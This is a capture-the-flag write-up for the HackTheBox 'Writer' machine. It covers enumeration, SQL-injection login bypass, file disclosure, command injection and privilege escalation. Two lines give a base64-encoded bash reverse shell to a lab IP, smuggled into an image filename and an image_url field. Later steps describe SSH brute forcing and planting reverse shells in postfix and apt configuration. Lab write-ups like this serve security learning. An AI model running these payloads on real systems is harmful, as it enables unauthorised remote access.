# HackTheBox-Writer

## NMAP

```bash
ORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)                                               
80/tcp  open  http        syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods:                                                     
|_  Supported Methods: OPTIONS HEAD GET                                
|_http-title: Story Bank | Writer.HTB
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.6.2                 
445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.6.2                 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Host script results:                                                      
| nbstat: NetBIOS name: WRITER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)                                                           
| Names:                                                                  
|   WRITER<00>           Flags: <unique><active>             
|   WRITER<03>           Flags: <unique><active>             
|   WRITER<20>           Flags: <unique><active>                          
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1e>        Flags: <group><active>                           
| Statistics:                               
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00       
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                    
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00     
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 16290/tcp): CLEAN (Couldn't connect)
|   Checking for Conficker.C or higher...
|   Check 2 (port 37291/tcp): CLEAN (Timeout)
|   Check 3 (port 56512/udp): CLEAN (Timeout)
|   Check 4 (port 39467/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.10: 
|_    Message signing enabled but not required
|_smb2-time: Protocol negotiation failed (SMB2)

```

NMAP scan returned us with 4 ports out which we can enumerate SMB and HTTP 

## PORT 135/445 (SMB)

First of all I am going to run `enum4linx-ng` to see if I can get usernames also the share names if anonymous login is enabled

<img src="https://i.imgur.com/h9cjqPu.png"/>

Here I am supplying an arguement `-A` which will check for groups,users, and shares so it's very handy 

<img src="https://i.imgur.com/eVNp62e.png"/>

It found the user `kyle` so let's scroll bit further

<img src="https://i.imgur.com/9tLrV7N.png"/>

And it also found three shares on smb, but with anonmyous login we can't read these shares

<img src="https://i.imgur.com/5XQQCBV.png"/>

## PORT 80 (HTTP)

Let's move further and enumerate the web server which is running `apache 2.4.41`

<img src="https://i.imgur.com/yPsbRRq.png"/>

If we go into `about` section we can the writer talks about reviewing stories for being posted on the website so maybe we could do something from here also there's an email through which we can contact him `admin@writer.htb` , so let's add `writer.htb` to `/etc/hosts` maybe we can find a subdomain 

<img src="https://i.imgur.com/nuSjd5s.png"/>

<img src="https://i.imgur.com/CBEmJQx.png"/>

I ran `gobuster` to fuzz for files and directories

<img src="https://i.imgur.com/2trXZ5d.png"/>

So first I checked the `contact` page but it wasn't sending anything on filling the input fields

<img src="https://i.imgur.com/fTbEjip.png"/>

Then I looked into `static` directory but didn't find much there

<img src="https://i.imgur.com/4ITnlYi.png"/>

Digged into these folders but I all I want was that it's using a wordpress like theme from wow themes

http://www.themepush.com/marketplace/free-html-template-moschino/

So there's nothing we can do here as it's HTML template , so I took a step back and ran `ffuf` this time for fuzzing 

<img src="https://i.imgur.com/BBhlvCk.png"/>

<img src="https://i.imgur.com/Dl4ccOv.png"/>

This returend us `adminstrative` directory , I guess I should switch to `ffuf` as my main fuzzing tool

<img src="https://i.imgur.com/iNeBYuu.png"/>

We can see a login portal here , so let's try the password `admin:admin`

<img src="https://i.imgur.com/jrwzc1K.png"/>

Next next try a basic sqli login by pass

<img src="https://i.imgur.com/BShyvst.png"/>

<img src="https://i.imgur.com/pCWYrD4.png"/>

And boom we are in !

<img src="https://i.imgur.com/MY2fhCl.png"/>

So it seems we are now the admin user that can post stories on that  "Story Bank" siite. I tried editing the story , replacing the thumbnail with php reverse shell by adding the extensions `.php.jpg` as only jgp files were allowed to be uploaded by it didn't worked .

Then I started to enumerate the database version manually.

<img src="https://i.imgur.com/SEYmob1.png"/>

We achieved this by first identifiying the number of columns in the table by using `union select` which is used to join to select quries together and then use `null` as we don't know the column data type so null can be used , and did this till I found the correct number columns as if we supply the 7th column it will give an error meaning that only 6 columns exist and then used the built in function `version()` to know the version of database being used . Further more I tried to view `/etc/passwd` and was successful in viewing it so we have LFI as well through sqli.

<img src="https://i.imgur.com/4ek4KIg.png"/>

Next I could think of is viewing the apache error log file so we can get poison that log file to get RCE (Remote Code Execution).

<img src="https://i.imgur.com/HYb6tFg.png"/>

But this didn't worked , maybe `www-data` doesn't have permissions to view that file , so we could try reading the apache virtual hosts file `/etc/apache2/sites-available/000-default.conf`

<img src="https://i.imgur.com/89VxEWm.png"/>

From this file , we get a path to `/var/www/writer.htb/writer.wsgi` , with load_file we can read what's the script about

<img src="https://i.imgur.com/3pd2SS0.png"/>

It's importing `__init__.py` from somewhere and we need to read this file, from this path `/var/www/writer.htb/writer/__init__.py` we can read that file

<img src="https://i.imgur.com/HdxbeH2.png"/>

We can see here that `os.system` will be called when we are going edit the image for the story thumbnail  so we'll need to create an `.jpg` file having with bash reverse shell in the image name

<img src="https://i.imgur.com/pxg9CJ4.png"/>

```bash
touch 'test.jpg;`echo "L2Jpbi9iYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE5Ny8yMjIyIDA+JjEi" |base64 -d|bash`;'
```

<img src="https://i.imgur.com/JmjOOo9.png"/>

So first we'll upload the jpg image file that we created 

<img src="https://i.imgur.com/nDP6H5T.png"/>

<img src="https://i.imgur.com/yUoqO07.png"/>

It has been uploaded , now we will need to intercept the request for editing the story image and then in `image_url` section we will need to call that file like this 

```bash
file:///var/www/writer.htb/writer/static/img/test.jpg;`echo "L2Jpbi9iYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE5Ny8yMjIyIDA+JjEi" |base64 -d|bash`;#
```

<img src="https://i.imgur.com/1guCey8.png"/>

From that `__int.py__` file we can get credentials to the `writer` database

<img src="https://i.imgur.com/tT0fv3e.png"/>

<img src="https://i.imgur.com/HrIz6ex.png"/>

But there wasn't anything useful that we could do with as this hash wasn't being cracked

<img src="https://i.imgur.com/lkpSuc5.png"/>

So I did some digging and found another password in `/etc/mysql/mariadb.cnf`

<img src="https://i.imgur.com/AF4xysd.png"/>

Which gives us this hash

<img src="https://i.imgur.com/EG2tBsb.png"/>

We can search on hashcat examples for this hash whose mode number is  `10000 `

<img src="https://i.imgur.com/wXy8C4m.png"/>

<img src="https://i.imgur.com/QbZ7Wnp.png"/>

After giving it some time , the hash will be cracked and then you can use `ssh` to login to target machine as `kyle` user

<img src="https://i.imgur.com/nWfOZ1b.png"/>

<img src="https://i.imgur.com/VTuofYz.png"/>

## Un-intended User

I got the user through brute forcing `kyle`'s ssh password which was the un-intended way using `hydra` , this was a much easier way as we didn't have to go through the trouble of looking at the source code and then creating an image file having bash reverse shell and playing around with burp suite.

<img src="https://i.imgur.com/EDYfKHJ.png"/>

We can upload `pspy` which is a process monitoring tool looking for running background processes or cronjobs running as `root`. On runinng `pspy` we can see the cronjobs

<img src="https://i.imgur.com/u0mr0aP.png"/>

And if we look it we can see two files being copied from root directory , `disclaimer` and `master.cf`

## Privilege Escalation To John

So in order to escalate to `john` we need to add a python3 reverse shell in `disclaimer` file as the bash reverse shell didn't work and we need to be quick enough to send an email as the cronjob would replace the disclaimer file

<img src="https://i.imgur.com/qmqW0K8.png"/>

Now copy this into `/etc/postfix` directory

<img src="https://i.imgur.com/EQVmbKl.png"/>

<img src="https://i.imgur.com/2ACmdlT.png"/>


## Privilege Escalation To Root

On getting a reverse shell through SMTP , we can check in which group we are in 

<img src="https://i.imgur.com/2u9No1E.png"/>

So being in the `management` group , let's use the `find` command to see which files or folders are owned by this group

<img src="https://i.imgur.com/I12zLLC.png"/>

We have permissions to add files in that directory which is related to `apt` 's configuration files.

<img src="https://i.imgur.com/f0YzDOr.png"/>

Here the cronjob is running which runs the `apt-get update` command plus it runs a command to delete files in that directory which are modified in less than 1 day but the update is being called again and again so there's a chance that we can put a configuration file that is invoked before running that `update` command having a reverse shell.

<img src="https://i.imgur.com/hDdTK35.png"/>

## References

https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/

https://itectec.com/unixlinux/how-to-run-a-command-before-download-with-apt-get/
